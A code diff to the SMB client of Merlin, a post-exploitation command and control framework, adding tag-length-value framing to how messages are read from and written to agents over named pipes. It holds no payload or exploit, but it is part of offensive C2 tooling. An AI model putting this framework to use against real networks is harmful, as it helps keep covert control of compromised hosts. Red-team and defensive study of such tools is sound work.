@@ -2,7 +2,7 @@
 
 // Merlin is a post-exploitation command and control framework.
 // This file is part of Merlin.
-// Copyright (C) 2022  Russel Van Tuyl
+// Copyright (C) 2023  Russel Van Tuyl
 
 // Merlin is free software: you can redistribute it and/or modify
 // it under the terms of the GNU General Public License as published by
@@ -24,6 +24,7 @@ import (
 	// Standard
 	"bytes"
 	"crypto/sha256"
+	"encoding/binary"
 	"encoding/gob"
 	"fmt"
 	"io"
@@ -38,8 +39,6 @@ import (
 	// X Package
 	"golang.org/x/sys/windows"
 
-	// 3rd Party
-	"github.com/Ne0nd0g/npipe"
 	uuid "github.com/satori/go.uuid"
 
 	// Merlin
@@ -433,22 +432,69 @@ func (client *Client) Listen() (returnMessages []messages.Base, err error) {
 	cli.Message(cli.NOTE, fmt.Sprintf("Listening for incoming messages from %s at %s...", client.connection.RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))
 
 	var n int
-	respData := make([]byte, 500000)
+	var tag uint32
+	var length uint64
+	var buff bytes.Buffer
+	for {
+		respData := make([]byte, 4096)
 
-	n, err = client.connection.Read(respData)
-	cli.Message(cli.NOTE, fmt.Sprintf("Read %d bytes from connection %s at %s", n, client.connection.RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))
-	if err != nil {
-		if err == io.EOF {
-			err = fmt.Errorf("received EOF from %s, the Agent's connection has been reset", client.connection.RemoteAddr())
+		n, err = client.connection.Read(respData)
+		cli.Message(cli.DEBUG, fmt.Sprintf("clients/smb.Listen(): Read %d bytes from connection %s at %s", n, client.connection.RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))
+		if err != nil {
+			if err == io.EOF {
+				err = fmt.Errorf("received EOF from %s, the Agent's connection has been reset", client.connection.RemoteAddr())
+				client.connection = nil
+				return
+			}
+			err = fmt.Errorf("there was an error reading the message from the connection with %s: %s", client.connection.RemoteAddr(), err)
+			return
+		}
+
+		// Add the bytes to the buffer
+		n, err = buff.Write(respData[:n])
+		if err != nil {
+			err = fmt.Errorf("clients/smb.Listen(): there was an error writing %d incoming bytes to the local buffer: %s", n, err)
 			client.connection = nil
 			return
 		}
-		err = fmt.Errorf("there was an error reading the message from the connection with %s: %s", client.connection.RemoteAddr(), err)
-		return
-	}
 
+		// If this is the first read on the connection determine the tag and data length
+		if tag == 0 {
+			// Ensure we have enough data to read the tag/type which is 4-bytes
+			if buff.Len() < 4 {
+				cli.Message(cli.DEBUG, fmt.Sprintf("clients/smb.Listen(): Need at least 4 bytes in the buffer to read the Type/Tag for TLV but only have %d", buff.Len()))
+				continue
+			}
+			tag = binary.BigEndian.Uint32(respData[:4])
+			if tag != 1 {
+				err = fmt.Errorf("clients/tcp.Listen(): Expected a type/tag value of 1 for TLV but got %d", tag)
+				client.connection = nil
+				return
+			}
+		}
+
+		if length == 0 {
+			// Ensure we have enough data to read the Length from TLV which is 8-bytes plus the 4-byte tag/type size
+			if buff.Len() < 12 {
+				cli.Message(cli.DEBUG, fmt.Sprintf("clients/smb.Listen(): Need at least 12 bytes in the buffer to read the Length for TLV but only have %d", buff.Len()))
+				continue
+			}
+			length = binary.BigEndian.Uint64(respData[4:12])
+		}
+
+		// If we've read all the data according to the length provided in TLV, then break the for loop
+		// Type/Tag size is 4-bytes, Length size is 8-bytes for TLV
+		if uint64(buff.Len()) == length+4+8 {
+			cli.Message(cli.DEBUG, fmt.Sprintf("clients/smb.Listen(): Finished reading data length of %d bytes into the buffer and moving forward to deconstruct the data", length))
+			break
+		} else {
+			cli.Message(cli.DEBUG, fmt.Sprintf("clients/smb.Listen(): Read %d of %d bytes into the buffer", buff.Len(), length))
+		}
+	}
+	cli.Message(cli.NOTE, fmt.Sprintf("Read %d bytes from connection %s at %s", buff.Len(), client.connection.RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))
 	var msg messages.Base
-	msg, err = client.Deconstruct(respData[:n])
+	// Type/Tag size is 4-bytes, Length size is 8-bytes for a total of 12-bytes for TLV
+	msg, err = client.Deconstruct(buff.Bytes()[12:])
 	if err != nil {
 		err = fmt.Errorf("clients/smb.Listen(): there was an error deconstructing the data: %s", err)
 		return
@@ -499,11 +545,23 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 			return
 		}
 	}
+
+	// Add in Tag/Type and Length for TLV
+	tag := make([]byte, 4)
+	binary.BigEndian.PutUint32(tag, 1)
+	length := make([]byte, 8)
+	binary.BigEndian.PutUint64(length, uint64(delegateBytes.Len()))
+
+	// Create TLV
+	outData := append(tag, length...)
+	outData = append(outData, delegateBytes.Bytes()...)
+	cli.Message(cli.DEBUG, fmt.Sprintf("clients/smb.Send(): Added Tag: %d and Length: %d to data size of %d\n", tag, uint64(delegateBytes.Len()), len(outData)))
+
 	cli.Message(cli.NOTE, fmt.Sprintf("Sending %s message to %s at %s", messages.String(m.Type), client.connection.RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))
 
 	// Write the message
 	cli.Message(cli.DEBUG, fmt.Sprintf("Writing message size: %d to: %s", delegateBytes.Len(), client.connection.RemoteAddr()))
-	n, err := client.connection.Write(delegateBytes.Bytes())
+	n, err := client.connection.Write(outData)
 	if err != nil {
 		err = fmt.Errorf("there was an error writing the message to the connection with %s: %s", client.connection.RemoteAddr(), err)
 		return
